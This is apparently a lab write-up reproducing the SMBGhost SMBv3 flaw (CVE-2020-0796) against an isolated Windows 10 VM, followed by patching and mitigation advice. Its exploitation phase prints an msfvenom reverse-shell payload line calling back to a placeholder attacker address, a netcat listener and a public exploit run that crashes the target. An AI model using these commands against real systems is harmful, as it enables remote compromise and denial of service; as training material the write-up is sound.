# Windows 10 Laboratory — SMBGhost Vulnerability (CVE-2020-0796)

**Platform:** Local Lab / Hybrid Setup
**Difficulty:** Medium
**Date:** 2026-10-25
**Category:** Network Vulnerability / Remote Denial of Service (RDoS) / Memory Corruption

---

## 🎯 Objective
The primary objective of this laboratory was to safely deploy a vulnerable target environment to analyze the mechanics of **CVE-2020-0796** (SMBGhost). The project evaluates infrastructure isolation, service exposure verification, and the impact of malformed data compression headers on the operating system's kernel.

## 🧰 Environment and Tools
- **Attacker:** Kali Linux (Rolling Version) — `[ATTACKER_IP]`
- **Victim:** Windows 10 Pro — Version 1909 / Build 18363 — `[VICTIM_IP]`
- **Tools:** Oracle VirtualBox, Nmap, Python3, MSFvenom, Netcat

---

## 🔍 Procedure

### Phase 0: Resource Acquisition and Victim Environment Deployment

#### 1. Vulnerable ISO Image Acquisition
Since the SMBGhost flaw specifically targets Windows 10 versions with active data compression in SMBv3, locating a build prior to the March 2020 security patches was required.
* **Resource:** Official Windows 10 Disk Image (Version 1909 / Build 18363 - 64-bit).
* **Source:** *Internet Archive* public digital preservation repository (ensuring an untampered, official ISO).
* **Storage:** The installation file was downloaded and hosted on a dedicated external Solid-State Drive (SSD) to optimize hypervisor read/write performance and conserve host space.

#### 2. Network Perimeter Isolation
Network parameters were modified within the hypervisor (VirtualBox) prior to the initial boot to completely cut off the victim machine's internet access. This strictly prevents background connections to update servers that would automatically patch the vulnerability.
* **Adapter Type:** Host-only Adapter.
* **Assigned Segment:** A private, isolated channel sharing direct communication exclusively with the attacker machine, with no external gateway.

#### 3. Installation Loop Bypass (Registry Modification)
During the initial deployment from the ISO image, the Windows setup assistant encountered an unexpected reboot loop interrupt (OOBE error). An administrative command prompt was forced via keyboard shortcut (`Shift + F10`) to fix the setup directive within the system registry, allowing a clean local installation:
* **Tool:** Registry Editor (`regedit`).
* **Modified Path:** `HKLM\SYSTEM\Setup\Status\ChildCompletion`
* **Parameter:** The `setup.exe` key value was altered from `1` to `3`, forcing the system to bypass the initialization error and proceed smoothly to local account configuration ("Limited Setup").

#### 4. Local Connectivity and Port Exposure
Once the desktop loaded, the static IPv4 address assignment within the isolated segment was verified. To allow the attacker machine to interact freely with the victim's file-sharing service (SMB), the native firewall profiles were entirely disabled using elevated privileges:

```cmd
:: Globally disable all Windows Firewall network profiles
netsh advfirewall set allprofiles state off
```

**Result:** Successful, bidirectional communication verified via diagnostic tools (`ping`) between both systems, effectively exposing the required file-sharing port (`445/TCP`) for the upcoming scanning and exploitation phases.

---

### Phase 1: Reconnaissance / Enumeration

The objective of this phase was to verify host availability over the network, confirm service exposure, and use non-intrusive checking scripts to detect the vulnerability state without destabilizing the target kernel.

#### Network Reachability and Port Scanning
An active network sweep was performed from the attacker machine toward the target host using **Nmap** to evaluate the status of the Server Message Block (SMB) infrastructure.

```bash
# Verify host reachability and scan the standard SMB port
nmap -p 445 [VICTIM_IP]
```

* **Observed Port Status:** Port `445/tcp` returned an explicit `open` state, confirming that the SMB service was actively listening and accepting inbound connections over the local network segment.

#### Non-Intrusive Vulnerability Assessment
To ensure the target operating system build was actively vulnerable before attempting execution vectors, a lightweight Python checker script was deployed. This script safely queries the target by sending specific headers to test if the SMBv3 implementation erroneously handles packet compression mechanisms.

```bash
# Clone the trusted SMBGhost scanner repository
git clone https://github.com
cd SMBGhost

# Execute the scanner against the target IP address
python3 scanner.py [VICTIM_IP]
```

* **Result:** The scanner successfully established a handshake with the target and flagged the service state. The terminal returned a positive indicator confirming that **the target machine is vulnerable** to the SMBGhost exploit, validating our lab configuration.

---

### Phase 2: Exploitation

With the target explicitly confirmed as vulnerable, the environment proceeded to the verification of the exploitation mechanics. Publicly available Proof-of-Concept (PoC) tools were deployed to analyze the behavior of the flaw when handling malicious payloads.

#### Remote Code Execution (RCE) / Remote Denial of Service (RDoS) Analysis
A Python exploit framework targeting the `srv2.sys` memory structures was launched from the attacker terminal. The tool attempts to overwrite vital kernel pointer variables by provoking an out-of-bounds write primitive via a crafted SMB2 compressed packet header.

```bash
# Generate a raw reverse shell payload using MSFvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=4444 -f raw -o exploit.bin

# Setup local listener
nc -lvnp 4444

# Execute the targeted exploit script using the specified syntax arguments
python3 exploit.py -ip [VICTIM_IP]
```

#### Technical Observations & Lab Behavior:
* **Kernel Pool Instability:** During execution, the kernel-level memory allocation routines demonstrated high instability. While the exploit successfully identified the base of the HAL heap and successfully injected the shellcode block into the calculated memory address, the micro-allocations within the virtual environment frequently colled into a thread panic.
* **Impact Realized:** The out-of-bounds primitive regularly forced a kernel panic before the network connection could stabilize back to the local listener. The target system immediately dropped all network connectivity, triggered a **Blue Screen of Death (BSOD)**, and entered an automated forced reboot sequence. This successfully demonstrated the high-severity Remote Denial of Service (RDoS) impact of the vulnerability in unpatched networks.

---

## 📌 Findings

* **Vulnerability Identified:** SMBGhost (CVE-2020-0796) — SMBv3 Compression Mechanism Remote Code Execution / Denial of Service.
* **Severity Classification:** **Critical** (CVSS v3.1 Base Score: **10.0**).
* **Impact Analysis:** An unauthenticated, remote attacker can exploit this flaw by sending a malformed packet to an affected SMBv3 server. In a production enterprise network, this could lead to widespread infrastructure disruption via automated replication (wormable capabilities) or unauthorized privilege escalation and system compromise.

---

## 🛡️ Mitigation / Remediation

To safeguard an enterprise environment from the risks demonstrated in this laboratory setup, the following mitigation and remediation strategies must be enforced:

1. **Deployment of Security Updates (Primary Remedy):**
   Apply the official Microsoft cumulative updates released in March 2020 (or later). Specifically, the installation of patch **KB4551762** addresses the underlying integer overflow by introducing proper bounds checking on input packet size validation within the `srv2.sys` driver.

2. **Disabling SMBv3 Compression (Workaround / Temporary Fix):**
   If patching cannot be immediately scheduled due to operational constraints, compression features within the SMBv3 protocol can be disabled administratively via PowerShell to negate the attack vector without disabling the file-sharing service itself:
   ```powershell
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "DisableCompression" -Type DWord -Value 1
   ```

3. **Perimeter Network Defenses:**
   Strictly restrict inbound traffic to TCP Port `445` at the network perimeter and host-based levels, allowing SMB communications only from trusted, segmented internal zones and isolating unpatched legacy infrastructure.

---

## 📚 Lessons Learned

* **The Risks of Legacy Protocol Configurations:** Underlines the critical importance of continuously auditing protocol implementations and active features (such as data compression) rather than assuming default services are inherently secure.
* **Criticality of Network Segmentation:** Demonstrates why target systems should never expose native file-sharing ports directly to unauthenticated network zones without intermediate barrier boundaries.

---

## 🔗 References
* Microsoft Security Advisory: [CVE-2020-0796](https://microsoft.com)
* NIST NVD Detail: [Vulnerability CVE-2020-0796](https://nist.gov)
* Exploit Concept Frameworks: Chompie1337 / Ollypwn Community Repositories

